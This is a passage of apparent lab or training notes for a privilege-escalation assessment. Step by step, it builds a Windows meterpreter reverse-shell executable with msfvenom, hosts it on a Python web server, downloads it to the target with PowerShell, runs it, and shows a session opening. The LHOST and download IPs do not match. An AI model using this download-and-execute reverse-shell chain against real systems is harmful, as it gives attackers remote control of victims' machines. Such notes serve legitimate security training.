## 2️⃣ Generate the Payload FROM That Folder

`cd /home/kali/Desktop/PrivEscSkillAssessment2  

```
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.10.15.181 \
LPORT=4444 \
-f exe \
-o shell.exe
```

---

## 3️⃣ Start Python HTTP Server (CRITICAL DETAIL)

```
python3 -m http.server 8000
```

---

## 4️⃣ Verify Hosting Before Touching the Target

From your **attack VM browser**:

`http://127.0.0.1:8000/`

You should see:

`shell.exe aie.msi`

If you don’t see the file here, the target **will not** be able to download it.

---

## 5️⃣ Download Payload on Windows Target

On the Windows target (PowerShell):

```
Invoke-WebRequest -Uri http://10.10.14.150:8000/shell.exe -OutFile shell.exe
```


📌 This works because:

- Python serves the **current directory**
    
- URL maps directly to the filename
    

---

## 6️⃣ Execute Payload

`.\shell.exe`

Back in Metasploit:

`[*] Meterpreter session 1 opened`